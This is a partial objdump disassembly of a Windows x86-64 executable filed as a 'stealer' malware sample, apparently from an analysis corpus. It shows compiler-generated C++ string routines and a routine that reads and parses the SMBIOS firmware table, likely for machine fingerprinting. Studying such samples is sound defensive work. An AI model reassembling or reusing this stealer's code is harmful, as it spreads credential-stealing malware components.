
malware_samples/stealer/860623d199c9763c1b195cbe21ea78914ecae8d24a7e7c048ab325b8d9eb4606.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	48 83 ec 38          	sub    $0x38,%rsp
   140001004:	48 85 c9             	test   %rcx,%rcx
   140001007:	75 07                	jne    0x140001010
   140001009:	33 c0                	xor    %eax,%eax
   14000100b:	48 83 c4 38          	add    $0x38,%rsp
   14000100f:	c3                   	ret
   140001010:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140001017:	72 2a                	jb     0x140001043
   140001019:	48 8d 41 27          	lea    0x27(%rcx),%rax
   14000101d:	48 3b c1             	cmp    %rcx,%rax
   140001020:	76 2a                	jbe    0x14000104c
   140001022:	48 8b c8             	mov    %rax,%rcx
   140001025:	e8 7e 29 00 00       	call   0x1400039a8
   14000102a:	48 8b c8             	mov    %rax,%rcx
   14000102d:	48 85 c0             	test   %rax,%rax
   140001030:	74 20                	je     0x140001052
   140001032:	48 83 c0 27          	add    $0x27,%rax
   140001036:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   14000103a:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   14000103e:	48 83 c4 38          	add    $0x38,%rsp
   140001042:	c3                   	ret
   140001043:	48 83 c4 38          	add    $0x38,%rsp
   140001047:	e9 5c 29 00 00       	jmp    0x1400039a8
   14000104c:	e8 1f 05 00 00       	call   0x140001570
   140001051:	cc                   	int3
   140001052:	45 33 c9             	xor    %r9d,%r9d
   140001055:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000105c:	00 00 
   14000105e:	45 33 c0             	xor    %r8d,%r8d
   140001061:	33 d2                	xor    %edx,%edx
   140001063:	33 c9                	xor    %ecx,%ecx
   140001065:	e8 42 62 00 00       	call   0x1400072ac
   14000106a:	cc                   	int3
   14000106b:	cc                   	int3
   14000106c:	cc                   	int3
   14000106d:	cc                   	int3
   14000106e:	cc                   	int3
   14000106f:	cc                   	int3
   140001070:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001075:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000107a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000107f:	41 56                	push   %r14
   140001081:	48 83 ec 20          	sub    $0x20,%rsp
   140001085:	48 be fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%rsi
   14000108c:	ff ff 7f 
   14000108f:	49 8b d8             	mov    %r8,%rbx
   140001092:	48 8b ea             	mov    %rdx,%rbp
   140001095:	4c 8b f1             	mov    %rcx,%r14
   140001098:	4c 3b c6             	cmp    %rsi,%r8
   14000109b:	0f 87 ad 00 00 00    	ja     0x14000114e
   1400010a1:	48 83 fb 07          	cmp    $0x7,%rbx
   1400010a5:	77 20                	ja     0x1400010c7
   1400010a7:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   1400010ab:	48 03 db             	add    %rbx,%rbx
   1400010ae:	4c 8b c3             	mov    %rbx,%r8
   1400010b1:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   1400010b8:	00 
   1400010b9:	e8 a2 ea 00 00       	call   0x14000fb60
   1400010be:	33 c0                	xor    %eax,%eax
   1400010c0:	66 42 89 04 33       	mov    %ax,(%rbx,%r14,1)
   1400010c5:	eb 4d                	jmp    0x140001114
   1400010c7:	48 8b c3             	mov    %rbx,%rax
   1400010ca:	48 83 c8 07          	or     $0x7,%rax
   1400010ce:	48 3b c6             	cmp    %rsi,%rax
   1400010d1:	76 57                	jbe    0x14000112a
   1400010d3:	48 b9 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rcx
   1400010da:	ff ff 7f 
   1400010dd:	48 03 c9             	add    %rcx,%rcx
   1400010e0:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   1400010e5:	e8 16 ff ff ff       	call   0x140001000
   1400010ea:	49 89 5e 10          	mov    %rbx,0x10(%r14)
   1400010ee:	48 8b d5             	mov    %rbp,%rdx
   1400010f1:	48 03 db             	add    %rbx,%rbx
   1400010f4:	49 89 06             	mov    %rax,(%r14)
   1400010f7:	4c 8b c3             	mov    %rbx,%r8
   1400010fa:	49 89 76 18          	mov    %rsi,0x18(%r14)
   1400010fe:	48 8b c8             	mov    %rax,%rcx
   140001101:	48 8b f8             	mov    %rax,%rdi
   140001104:	e8 57 ea 00 00       	call   0x14000fb60
   140001109:	33 c0                	xor    %eax,%eax
   14000110b:	66 89 04 3b          	mov    %ax,(%rbx,%rdi,1)
   14000110f:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140001114:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001119:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   14000111e:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140001123:	48 83 c4 20          	add    $0x20,%rsp
   140001127:	41 5e                	pop    %r14
   140001129:	c3                   	ret
   14000112a:	b9 0a 00 00 00       	mov    $0xa,%ecx
   14000112f:	48 8b f0             	mov    %rax,%rsi
   140001132:	48 3b c1             	cmp    %rcx,%rax
   140001135:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000113c:	ff ff 7f 
   14000113f:	48 0f 42 f1          	cmovb  %rcx,%rsi
   140001143:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   140001147:	48 3b c8             	cmp    %rax,%rcx
   14000114a:	77 08                	ja     0x140001154
   14000114c:	eb 8f                	jmp    0x1400010dd
   14000114e:	e8 3d 04 00 00       	call   0x140001590
   140001153:	cc                   	int3
   140001154:	e8 17 04 00 00       	call   0x140001570
   140001159:	cc                   	int3
   14000115a:	cc                   	int3
   14000115b:	cc                   	int3
   14000115c:	cc                   	int3
   14000115d:	cc                   	int3
   14000115e:	cc                   	int3
   14000115f:	cc                   	int3
   140001160:	40 53                	rex push %rbx
   140001162:	48 83 ec 20          	sub    $0x20,%rsp
   140001166:	48 8b d9             	mov    %rcx,%rbx
   140001169:	48 8b c2             	mov    %rdx,%rax
   14000116c:	48 8d 0d 4d 02 01 00 	lea    0x1024d(%rip),%rcx        # 0x1400113c0
   140001173:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001176:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000117a:	48 89 0b             	mov    %rcx,(%rbx)
   14000117d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001181:	0f 11 02             	movups %xmm0,(%rdx)
   140001184:	e8 37 36 00 00       	call   0x1400047c0
   140001189:	48 8d 05 60 02 01 00 	lea    0x10260(%rip),%rax        # 0x1400113f0
   140001190:	48 89 03             	mov    %rax,(%rbx)
   140001193:	48 8b c3             	mov    %rbx,%rax
   140001196:	48 83 c4 20          	add    $0x20,%rsp
   14000119a:	5b                   	pop    %rbx
   14000119b:	c3                   	ret
   14000119c:	cc                   	int3
   14000119d:	cc                   	int3
   14000119e:	cc                   	int3
   14000119f:	cc                   	int3
   1400011a0:	40 53                	rex push %rbx
   1400011a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400011a6:	48 8b d9             	mov    %rcx,%rbx
   1400011a9:	48 8b c2             	mov    %rdx,%rax
   1400011ac:	48 8d 0d 0d 02 01 00 	lea    0x1020d(%rip),%rcx        # 0x1400113c0
   1400011b3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400011b6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   1400011ba:	48 89 0b             	mov    %rcx,(%rbx)
   1400011bd:	48 8d 48 08          	lea    0x8(%rax),%rcx
   1400011c1:	0f 11 02             	movups %xmm0,(%rdx)
   1400011c4:	e8 f7 35 00 00       	call   0x1400047c0
   1400011c9:	48 8d 05 38 02 01 00 	lea    0x10238(%rip),%rax        # 0x140011408
   1400011d0:	48 89 03             	mov    %rax,(%rbx)
   1400011d3:	48 8b c3             	mov    %rbx,%rax
   1400011d6:	48 83 c4 20          	add    $0x20,%rsp
   1400011da:	5b                   	pop    %rbx
   1400011db:	c3                   	ret
   1400011dc:	cc                   	int3
   1400011dd:	cc                   	int3
   1400011de:	cc                   	int3
   1400011df:	cc                   	int3
   1400011e0:	48 8d 05 31 02 01 00 	lea    0x10231(%rip),%rax        # 0x140011418
   1400011e7:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   1400011ee:	00 
   1400011ef:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1400011f3:	48 8d 05 0e 02 01 00 	lea    0x1020e(%rip),%rax        # 0x140011408
   1400011fa:	48 89 01             	mov    %rax,(%rcx)
   1400011fd:	48 8b c1             	mov    %rcx,%rax
   140001200:	c3                   	ret
   140001201:	cc                   	int3
   140001202:	cc                   	int3
   140001203:	cc                   	int3
   140001204:	cc                   	int3
   140001205:	cc                   	int3
   140001206:	cc                   	int3
   140001207:	cc                   	int3
   140001208:	cc                   	int3
   140001209:	cc                   	int3
   14000120a:	cc                   	int3
   14000120b:	cc                   	int3
   14000120c:	cc                   	int3
   14000120d:	cc                   	int3
   14000120e:	cc                   	int3
   14000120f:	cc                   	int3
   140001210:	40 53                	rex push %rbx
   140001212:	48 83 ec 20          	sub    $0x20,%rsp
   140001216:	48 8b d9             	mov    %rcx,%rbx
   140001219:	48 8b c2             	mov    %rdx,%rax
   14000121c:	48 8d 0d 9d 01 01 00 	lea    0x1019d(%rip),%rcx        # 0x1400113c0
   140001223:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001226:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   14000122a:	48 89 0b             	mov    %rcx,(%rbx)
   14000122d:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001231:	0f 11 02             	movups %xmm0,(%rdx)
   140001234:	e8 87 35 00 00       	call   0x1400047c0
   140001239:	48 8b c3             	mov    %rbx,%rax
   14000123c:	48 83 c4 20          	add    $0x20,%rsp
   140001240:	5b                   	pop    %rbx
   140001241:	c3                   	ret
   140001242:	cc                   	int3
   140001243:	cc                   	int3
   140001244:	cc                   	int3
   140001245:	cc                   	int3
   140001246:	cc                   	int3
   140001247:	cc                   	int3
   140001248:	cc                   	int3
   140001249:	cc                   	int3
   14000124a:	cc                   	int3
   14000124b:	cc                   	int3
   14000124c:	cc                   	int3
   14000124d:	cc                   	int3
   14000124e:	cc                   	int3
   14000124f:	cc                   	int3
   140001250:	48 8d 05 69 01 01 00 	lea    0x10169(%rip),%rax        # 0x1400113c0
   140001257:	48 89 01             	mov    %rax,(%rcx)
   14000125a:	48 83 c1 08          	add    $0x8,%rcx
   14000125e:	e9 dd 35 00 00       	jmp    0x140004840
   140001263:	cc                   	int3
   140001264:	cc                   	int3
   140001265:	cc                   	int3
   140001266:	cc                   	int3
   140001267:	cc                   	int3
   140001268:	cc                   	int3
   140001269:	cc                   	int3
   14000126a:	cc                   	int3
   14000126b:	cc                   	int3
   14000126c:	cc                   	int3
   14000126d:	cc                   	int3
   14000126e:	cc                   	int3
   14000126f:	cc                   	int3
   140001270:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001275:	57                   	push   %rdi
   140001276:	48 83 ec 20          	sub    $0x20,%rsp
   14000127a:	48 8d 05 3f 01 01 00 	lea    0x1013f(%rip),%rax        # 0x1400113c0
   140001281:	48 8b f9             	mov    %rcx,%rdi
   140001284:	48 89 01             	mov    %rax,(%rcx)
   140001287:	8b da                	mov    %edx,%ebx
   140001289:	48 83 c1 08          	add    $0x8,%rcx
   14000128d:	e8 ae 35 00 00       	call   0x140004840
   140001292:	f6 c3 01             	test   $0x1,%bl
   140001295:	74 0d                	je     0x1400012a4
   140001297:	ba 18 00 00 00       	mov    $0x18,%edx
   14000129c:	48 8b cf             	mov    %rdi,%rcx
   14000129f:	e8 40 27 00 00       	call   0x1400039e4
   1400012a4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400012a9:	48 8b c7             	mov    %rdi,%rax
   1400012ac:	48 83 c4 20          	add    $0x20,%rsp
   1400012b0:	5f                   	pop    %rdi
   1400012b1:	c3                   	ret
   1400012b2:	cc                   	int3
   1400012b3:	cc                   	int3
   1400012b4:	cc                   	int3
   1400012b5:	cc                   	int3
   1400012b6:	cc                   	int3
   1400012b7:	cc                   	int3
   1400012b8:	cc                   	int3
   1400012b9:	cc                   	int3
   1400012ba:	cc                   	int3
   1400012bb:	cc                   	int3
   1400012bc:	cc                   	int3
   1400012bd:	cc                   	int3
   1400012be:	cc                   	int3
   1400012bf:	cc                   	int3
   1400012c0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400012c5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400012ca:	56                   	push   %rsi
   1400012cb:	57                   	push   %rdi
   1400012cc:	41 54                	push   %r12
   1400012ce:	41 56                	push   %r14
   1400012d0:	41 57                	push   %r15
   1400012d2:	48 81 ec 70 01 00 00 	sub    $0x170,%rsp
   1400012d9:	48 8b 05 20 cd 01 00 	mov    0x1cd20(%rip),%rax        # 0x14001e000
   1400012e0:	48 33 c4             	xor    %rsp,%rax
   1400012e3:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   1400012ea:	00 
   1400012eb:	4c 8b f1             	mov    %rcx,%r14
   1400012ee:	4c 8d 25 4f 01 01 00 	lea    0x1014f(%rip),%r12        # 0x140011444
   1400012f5:	33 db                	xor    %ebx,%ebx
   1400012f7:	bd 00 01 00 00       	mov    $0x100,%ebp
   1400012fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140001300:	49 83 7e 18 07       	cmpq   $0x7,0x18(%r14)
   140001305:	48 8d 73 01          	lea    0x1(%rbx),%rsi
   140001309:	49 8b 56 10          	mov    0x10(%r14),%rdx
   14000130d:	4d 8b fe             	mov    %r14,%r15
   140001310:	76 03                	jbe    0x140001315
   140001312:	4d 8b 3e             	mov    (%r14),%r15
   140001315:	48 3b f2             	cmp    %rdx,%rsi
   140001318:	0f 83 90 00 00 00    	jae    0x1400013ae
   14000131e:	49 8d 3c 57          	lea    (%r15,%rdx,2),%rdi
   140001322:	48 2b d6             	sub    %rsi,%rdx
   140001325:	49 8d 1c 77          	lea    (%r15,%rsi,2),%rbx
   140001329:	48 8d 42 02          	lea    0x2(%rdx),%rax
   14000132d:	48 83 f8 10          	cmp    $0x10,%rax
   140001331:	72 23                	jb     0x140001356
   140001333:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   140001339:	4c 8d 05 00 01 01 00 	lea    0x10100(%rip),%r8        # 0x140011440
   140001340:	48 8b cb             	mov    %rbx,%rcx
   140001343:	e8 48 25 00 00       	call   0x140003890
   140001348:	48 8b d8             	mov    %rax,%rbx
   14000134b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000134f:	74 64                	je     0x1400013b5
   140001351:	48 03 de             	add    %rsi,%rbx
   140001354:	eb 5f                	jmp    0x1400013b5
   140001356:	4c 8b c5             	mov    %rbp,%r8
   140001359:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000135e:	33 d2                	xor    %edx,%edx
   140001360:	e8 9b ee 00 00       	call   0x140010200
   140001365:	48 8d 0d d4 00 01 00 	lea    0x100d4(%rip),%rcx        # 0x140011440
   14000136c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001370:	0f b7 01             	movzwl (%rcx),%eax
   140001373:	66 3b c5             	cmp    %bp,%ax
   140001376:	0f 83 f3 00 00 00    	jae    0x14000146f
   14000137c:	0f b6 c0             	movzbl %al,%eax
   14000137f:	48 83 c1 02          	add    $0x2,%rcx
   140001383:	c6 44 04 40 01       	movb   $0x1,0x40(%rsp,%rax,1)
   140001388:	49 3b cc             	cmp    %r12,%rcx
   14000138b:	75 e3                	jne    0x140001370
   14000138d:	48 3b df             	cmp    %rdi,%rbx
   140001390:	73 1c                	jae    0x1400013ae
   140001392:	0f b7 03             	movzwl (%rbx),%eax
   140001395:	66 3b c5             	cmp    %bp,%ax
   140001398:	73 0b                	jae    0x1400013a5
   14000139a:	80 7c 04 40 00       	cmpb   $0x0,0x40(%rsp,%rax,1)
   14000139f:	0f 85 03 01 00 00    	jne    0x1400014a8
   1400013a5:	48 83 c3 02          	add    $0x2,%rbx
   1400013a9:	48 3b df             	cmp    %rdi,%rbx
   1400013ac:	72 e4                	jb     0x140001392
   1400013ae:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   1400013b5:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1400013b9:	0f 84 f4 00 00 00    	je     0x1400014b3
   1400013bf:	49 39 5e 10          	cmp    %rbx,0x10(%r14)
   1400013c3:	4c 8b c3             	mov    %rbx,%r8
   1400013c6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400013c9:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400013cc:	4d 0f 42 46 10       	cmovb  0x10(%r14),%r8
   1400013d1:	49 8b d6             	mov    %r14,%rdx
   1400013d4:	49 83 7e 18 07       	cmpq   $0x7,0x18(%r14)
   1400013d9:	0f 11 84 24 40 01 00 	movups %xmm0,0x140(%rsp)
   1400013e0:	00 
   1400013e1:	f3 0f 7f 8c 24 50 01 	movdqu %xmm1,0x150(%rsp)
   1400013e8:	00 00 
   1400013ea:	76 03                	jbe    0x1400013ef
   1400013ec:	49 8b 16             	mov    (%r14),%rdx
   1400013ef:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   1400013f6:	00 
   1400013f7:	e8 74 fc ff ff       	call   0x140001070
   1400013fc:	48 83 bc 24 58 01 00 	cmpq   $0x7,0x158(%rsp)
   140001403:	00 07 
   140001405:	48 8d 8c 24 40 01 00 	lea    0x140(%rsp),%rcx
   14000140c:	00 
   14000140d:	48 0f 47 8c 24 40 01 	cmova  0x140(%rsp),%rcx
   140001414:	00 00 
   140001416:	33 d2                	xor    %edx,%edx
   140001418:	ff 15 12 fc 00 00    	call   *0xfc12(%rip)        # 0x140011030
   14000141e:	48 8b 94 24 58 01 00 	mov    0x158(%rsp),%rdx
   140001425:	00 
   140001426:	48 83 fa 07          	cmp    $0x7,%rdx
   14000142a:	0f 86 d0 fe ff ff    	jbe    0x140001300
   140001430:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
   140001437:	00 
   140001438:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   14000143f:	00 
   140001440:	48 8b c1             	mov    %rcx,%rax
   140001443:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000144a:	72 19                	jb     0x140001465
   14000144c:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140001450:	48 83 c2 27          	add    $0x27,%rdx
   140001454:	48 2b c1             	sub    %rcx,%rax
   140001457:	48 83 e8 08          	sub    $0x8,%rax
   14000145b:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000145f:	0f 87 8f 00 00 00    	ja     0x1400014f4
   140001465:	e8 7a 25 00 00       	call   0x1400039e4
   14000146a:	e9 91 fe ff ff       	jmp    0x140001300
   14000146f:	48 3b df             	cmp    %rdi,%rbx
   140001472:	0f 83 36 ff ff ff    	jae    0x1400013ae
   140001478:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000147f:	00 
   140001480:	0f b7 13             	movzwl (%rbx),%edx
   140001483:	48 8d 0d b6 ff 00 00 	lea    0xffb6(%rip),%rcx        # 0x140011440
   14000148a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140001490:	e8 6b 15 00 00       	call   0x140002a00
   140001495:	48 85 c0             	test   %rax,%rax
   140001498:	75 0e                	jne    0x1400014a8
   14000149a:	48 83 c3 02          	add    $0x2,%rbx
   14000149e:	48 3b df             	cmp    %rdi,%rbx
   1400014a1:	72 dd                	jb     0x140001480
   1400014a3:	e9 06 ff ff ff       	jmp    0x1400013ae
   1400014a8:	49 2b df             	sub    %r15,%rbx
   1400014ab:	48 d1 fb             	sar    $1,%rbx
   1400014ae:	e9 02 ff ff ff       	jmp    0x1400013b5
   1400014b3:	49 83 7e 18 07       	cmpq   $0x7,0x18(%r14)
   1400014b8:	76 03                	jbe    0x1400014bd
   1400014ba:	4d 8b 36             	mov    (%r14),%r14
   1400014bd:	33 d2                	xor    %edx,%edx
   1400014bf:	49 8b ce             	mov    %r14,%rcx
   1400014c2:	ff 15 68 fb 00 00    	call   *0xfb68(%rip)        # 0x140011030
   1400014c8:	48 8b 8c 24 60 01 00 	mov    0x160(%rsp),%rcx
   1400014cf:	00 
   1400014d0:	48 33 cc             	xor    %rsp,%rcx
   1400014d3:	e8 a8 25 00 00       	call   0x140003a80
   1400014d8:	4c 8d 9c 24 70 01 00 	lea    0x170(%rsp),%r11
   1400014df:	00 
   1400014e0:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   1400014e4:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   1400014e8:	49 8b e3             	mov    %r11,%rsp
   1400014eb:	41 5f                	pop    %r15
   1400014ed:	41 5e                	pop    %r14
   1400014ef:	41 5c                	pop    %r12
   1400014f1:	5f                   	pop    %rdi
   1400014f2:	5e                   	pop    %rsi
   1400014f3:	c3                   	ret
   1400014f4:	45 33 c9             	xor    %r9d,%r9d
   1400014f7:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400014fe:	00 00 
   140001500:	45 33 c0             	xor    %r8d,%r8d
   140001503:	33 d2                	xor    %edx,%edx
   140001505:	33 c9                	xor    %ecx,%ecx
   140001507:	e8 a0 5d 00 00       	call   0x1400072ac
   14000150c:	cc                   	int3
   14000150d:	cc                   	int3
   14000150e:	cc                   	int3
   14000150f:	cc                   	int3
   140001510:	48 83 ec 38          	sub    $0x38,%rsp
   140001514:	48 8b c2             	mov    %rdx,%rax
   140001517:	4a 8d 14 45 02 00 00 	lea    0x2(,%r8,2),%rdx
   14000151e:	00 
   14000151f:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001526:	72 18                	jb     0x140001540
   140001528:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   14000152c:	48 83 c2 27          	add    $0x27,%rdx
   140001530:	48 2b c1             	sub    %rcx,%rax
   140001533:	48 83 e8 08          	sub    $0x8,%rax
   140001537:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000153b:	77 0f                	ja     0x14000154c
   14000153d:	48 8b c1             	mov    %rcx,%rax
   140001540:	48 8b c8             	mov    %rax,%rcx
   140001543:	48 83 c4 38          	add    $0x38,%rsp
   140001547:	e9 98 24 00 00       	jmp    0x1400039e4
   14000154c:	45 33 c9             	xor    %r9d,%r9d
   14000154f:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001556:	00 00 
   140001558:	45 33 c0             	xor    %r8d,%r8d
   14000155b:	33 d2                	xor    %edx,%edx
   14000155d:	33 c9                	xor    %ecx,%ecx
   14000155f:	e8 48 5d 00 00       	call   0x1400072ac
   140001564:	cc                   	int3
   140001565:	cc                   	int3
   140001566:	cc                   	int3
   140001567:	cc                   	int3
   140001568:	cc                   	int3
   140001569:	cc                   	int3
   14000156a:	cc                   	int3
   14000156b:	cc                   	int3
   14000156c:	cc                   	int3
   14000156d:	cc                   	int3
   14000156e:	cc                   	int3
   14000156f:	cc                   	int3
   140001570:	48 83 ec 48          	sub    $0x48,%rsp
   140001574:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001579:	e8 62 fc ff ff       	call   0x1400011e0
   14000157e:	48 8d 15 53 b5 01 00 	lea    0x1b553(%rip),%rdx        # 0x14001cad8
   140001585:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000158a:	e8 d9 32 00 00       	call   0x140004868
   14000158f:	cc                   	int3
   140001590:	48 83 ec 28          	sub    $0x28,%rsp
   140001594:	48 8d 0d 95 fe 00 00 	lea    0xfe95(%rip),%rcx        # 0x140011430
   14000159b:	e8 c4 16 00 00       	call   0x140002c64
   1400015a0:	cc                   	int3
   1400015a1:	cc                   	int3
   1400015a2:	cc                   	int3
   1400015a3:	cc                   	int3
   1400015a4:	cc                   	int3
   1400015a5:	cc                   	int3
   1400015a6:	cc                   	int3
   1400015a7:	cc                   	int3
   1400015a8:	cc                   	int3
   1400015a9:	cc                   	int3
   1400015aa:	cc                   	int3
   1400015ab:	cc                   	int3
   1400015ac:	cc                   	int3
   1400015ad:	cc                   	int3
   1400015ae:	cc                   	int3
   1400015af:	cc                   	int3
   1400015b0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400015b5:	55                   	push   %rbp
   1400015b6:	56                   	push   %rsi
   1400015b7:	57                   	push   %rdi
   1400015b8:	48 81 ec 80 02 00 00 	sub    $0x280,%rsp
   1400015bf:	48 8b 05 3a ca 01 00 	mov    0x1ca3a(%rip),%rax        # 0x14001e000
   1400015c6:	48 33 c4             	xor    %rsp,%rax
   1400015c9:	48 89 84 24 70 02 00 	mov    %rax,0x270(%rsp)
   1400015d0:	00 
   1400015d1:	33 f6                	xor    %esi,%esi
   1400015d3:	4c 89 b4 24 a0 02 00 	mov    %r14,0x2a0(%rsp)
   1400015da:	00 
   1400015db:	45 33 c9             	xor    %r9d,%r9d
   1400015de:	45 33 c0             	xor    %r8d,%r8d
   1400015e1:	33 d2                	xor    %edx,%edx
   1400015e3:	b9 42 4d 53 52       	mov    $0x52534d42,%ecx
   1400015e8:	8b ee                	mov    %esi,%ebp
   1400015ea:	ff 15 a8 fa 00 00    	call   *0xfaa8(%rip)        # 0x140011098
   1400015f0:	8b f8                	mov    %eax,%edi
   1400015f2:	85 c0                	test   %eax,%eax
   1400015f4:	0f 84 49 01 00 00    	je     0x140001743
   1400015fa:	ff 15 80 fa 00 00    	call   *0xfa80(%rip)        # 0x140011080
   140001600:	44 8b c7             	mov    %edi,%r8d
   140001603:	33 d2                	xor    %edx,%edx
   140001605:	48 8b c8             	mov    %rax,%rcx
   140001608:	ff 15 62 fa 00 00    	call   *0xfa62(%rip)        # 0x140011070
   14000160e:	48 8b d8             	mov    %rax,%rbx
   140001611:	48 85 c0             	test   %rax,%rax
   140001614:	0f 84 29 01 00 00    	je     0x140001743
   14000161a:	44 8b cf             	mov    %edi,%r9d
   14000161d:	4c 8b c0             	mov    %rax,%r8
   140001620:	33 d2                	xor    %edx,%edx
   140001622:	b9 42 4d 53 52       	mov    $0x52534d42,%ecx
   140001627:	4c 8b f0             	mov    %rax,%r14
   14000162a:	ff 15 68 fa 00 00    	call   *0xfa68(%rip)        # 0x140011098
   140001630:	85 c0                	test   %eax,%eax
   140001632:	0f 84 f7 00 00 00    	je     0x14000172f
   140001638:	44 8b 4b 04          	mov    0x4(%rbx),%r9d
   14000163c:	4c 8d 43 08          	lea    0x8(%rbx),%r8
   140001640:	4d 85 c0             	test   %r8,%r8
   140001643:	0f 84 e6 00 00 00    	je     0x14000172f
   140001649:	8b ce                	mov    %esi,%ecx
   14000164b:	41 83 f9 04          	cmp    $0x4,%r9d
   14000164f:	72 51                	jb     0x1400016a2
   140001651:	44 8b d9             	mov    %ecx,%r11d
   140001654:	47 0f b6 54 03 01    	movzbl 0x1(%r11,%r8,1),%r10d
   14000165a:	41 80 fa 04          	cmp    $0x4,%r10b
   14000165e:	72 42                	jb     0x1400016a2
   140001660:	42 8d 14 11          	lea    (%rcx,%r10,1),%edx
   140001664:	41 3b d1             	cmp    %r9d,%edx
   140001667:	77 39                	ja     0x1400016a2
   140001669:	43 80 3c 03 03       	cmpb   $0x3,(%r11,%r8,1)
   14000166e:	75 0a                	jne    0x14000167a
   140001670:	41 80 fa 06          	cmp    $0x6,%r10b
   140001674:	0f 83 d5 01 00 00    	jae    0x14000184f
   14000167a:	8d 42 01             	lea    0x1(%rdx),%eax
   14000167d:	41 3b c1             	cmp    %r9d,%eax
   140001680:	73 15                	jae    0x140001697
   140001682:	42 38 34 02          	cmp    %sil,(%rdx,%r8,1)
   140001686:	75 06                	jne    0x14000168e
   140001688:	42 38 34 00          	cmp    %sil,(%rax,%r8,1)
   14000168c:	74 09                	je     0x140001697
   14000168e:	ff c2                	inc    %edx
   140001690:	ff c0                	inc    %eax
   140001692:	41 3b c1             	cmp    %r9d,%eax
   140001695:	72 eb                	jb     0x140001682
   140001697:	8d 4a 02             	lea    0x2(%rdx),%ecx
   14000169a:	8d 41 04             	lea    0x4(%rcx),%eax
   14000169d:	41 3b c1             	cmp    %r9d,%eax
   1400016a0:	76 af                	jbe    0x140001651
   1400016a2:	8b de                	mov    %esi,%ebx
   1400016a4:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   1400016aa:	8b d6                	mov    %esi,%edx
   1400016ac:	41 83 f9 04          	cmp    $0x4,%r9d
   1400016b0:	0f 82 79 00 00 00    	jb     0x14000172f
   1400016b6:	bf ff ff 00 00       	mov    $0xffff,%edi
   1400016bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400016c0:	8b ca                	mov    %edx,%ecx
   1400016c2:	49 03 c8             	add    %r8,%rcx
   1400016c5:	44 0f b6 51 01       	movzbl 0x1(%rcx),%r10d
   1400016ca:	41 80 fa 04          	cmp    $0x4,%r10b
   1400016ce:	72 53                	jb     0x140001723
   1400016d0:	41 03 d2             	add    %r10d,%edx
   1400016d3:	41 3b d1             	cmp    %r9d,%edx
   1400016d6:	77 4b                	ja     0x140001723
   1400016d8:	80 39 11             	cmpb   $0x11,(%rcx)
   1400016db:	75 1e                	jne    0x1400016fb
   1400016dd:	41 80 fa 17          	cmp    $0x17,%r10b
   1400016e1:	72 18                	jb     0x1400016fb
   1400016e3:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   1400016e7:	66 85 c0             	test   %ax,%ax
   1400016ea:	74 0f                	je     0x1400016fb
   1400016ec:	66 3b c7             	cmp    %di,%ax
   1400016ef:	74 0a                	je     0x1400016fb
